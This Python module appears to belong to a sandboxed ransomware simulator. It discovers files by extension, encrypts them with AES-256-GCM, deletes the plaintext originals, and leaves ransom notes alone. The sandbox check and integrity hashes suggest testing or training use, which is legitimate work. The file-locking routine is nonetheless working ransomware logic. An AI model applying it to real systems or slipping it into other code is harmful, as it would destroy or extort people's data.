"""
modules/file_encryptor.py
AES-256-GCM file encryption with per-file nonce and SHA-256 integrity tracking.

Encrypted file layout on disk:
  [config.NONCE_SIZE bytes nonce][ciphertext + config.AUTH_TAG_SIZE bytes GCM tag]

The original file is renamed/removed after encryption (if permissions allow).
Its SHA-256 hash is stored in EncryptionResult for later verification.
"""
from __future__ import annotations

import os
from dataclasses import dataclass, field
from pathlib import Path
from typing import List

from cryptography.hazmat.primitives.ciphers.aead import AESGCM

import config
from utils.logger import get_logger
from utils.validator import is_within_sandbox
from utils.hashing import sha256_file

logger = get_logger(__name__, log_file=config.LOG_FILE)



@dataclass
class EncryptionResult:
    path: str
    original_size: int
    sha256_before: str
    encrypted_path: str = ""
    success: bool = False
    original_removed: bool = False  # whether the plaintext was deleted
    error: str = ""


@dataclass
class DecryptionResult:
    encrypted_path: str
    restored_path: str = ""
    sha256_match: bool = False
    success: bool = False
    error: str = ""


class FileEncryptor:
    """Discovers and encrypts target files within a sandbox directory."""

    def __init__(self, key: bytes, sandbox: Path) -> None:
        if len(key) != config.KEY_SIZE:
            raise ValueError(f"AES-{config.KEY_SIZE*8} requires a {config.KEY_SIZE}-byte key.")
        self._aesgcm = AESGCM(key)
        self.sandbox = sandbox
        self.results: List[EncryptionResult] = []

    # ── Discovery ─────────────────────────────────────────────────────────────

    def discover_files(self) -> List[Path]:
        """Return all target files inside the sandbox, sorted."""
        targets: List[Path] = []
        for ext in config.TARGET_EXTENSIONS:
            targets.extend(self.sandbox.rglob(f"*{ext}"))
        # Exclude already-locked files and ransom notes
        targets = sorted(
            p for p in set(targets)
            if not p.name.endswith(config.ENCRYPTED_EXT)
            and p.name != config.RANSOM_NOTE_NAME
        )
        logger.info(
            "Discovery: %d target file(s) found in %s", len(targets), self.sandbox
        )
        for p in targets:
            logger.debug("  -> %s", p)
        return targets

    # ── Encryption ────────────────────────────────────────────────────────────

    def encrypt_file(self, path: Path) -> EncryptionResult:
        """Encrypt a single file. Returns EncryptionResult."""
        result = EncryptionResult(
            path=str(path),
            original_size=path.stat().st_size,
            sha256_before=sha256_file(path),
        )

        if not is_within_sandbox(path, self.sandbox):
            result.error = "Path outside sandbox — skipped."
            logger.warning("SKIP (outside sandbox): %s", path)
            return result

        encrypted_path = path.with_suffix(path.suffix + config.ENCRYPTED_EXT)

        try:
            # 1. Generate random nonce (12 bytes for GCM)
            nonce = os.urandom(config.NONCE_SIZE)

            # 2. Encrypt
            plaintext = path.read_bytes()
            ciphertext = self._aesgcm.encrypt(nonce, plaintext, None)

            # 3. Write: [NONCE_SIZE B nonce][ciphertext + AUTH_TAG_SIZE B GCM tag]
            encrypted_path.write_bytes(nonce + ciphertext)

            result.encrypted_path = str(encrypted_path)
            result.success = True

            # 4. Attempt to remove original plaintext
            try:
                path.unlink()
                result.original_removed = True
                logger.info(
                    "ENCRYPTED  %-45s  %d B  sha256=%.16s…",
                    path.name, result.original_size, result.sha256_before,
                )
            except PermissionError:
                # On some filesystems (e.g., read-only mounts) deletion may
                # be restricted. The encrypted copy still exists — log a warning.
                result.original_removed = False
                logger.warning(
                    "ENCRYPTED  %-45s  (original could not be removed — permission denied)",
                    path.name,
                )

        except Exception as exc:
            result.error = str(exc)
            result.success = False
            logger.error("FAILED to encrypt %s: %s", path, exc)
            # Clean up partial encrypted file
            try:
                if encrypted_path.exists():
                    encrypted_path.unlink()
            except Exception:
                pass

        return result

    def encrypt_all(self) -> List[EncryptionResult]:
        """Discover and encrypt all target files. Stores results internally."""
        files = self.discover_files()
        if not files:
            logger.warning("No target files found — nothing to encrypt.")
            return []

        for f in files:
            r = self.encrypt_file(f)
            self.results.append(r)

        ok = sum(1 for r in self.results if r.success)
        logger.info("Encryption complete: %d/%d files encrypted.", ok, len(files))
        return self.results
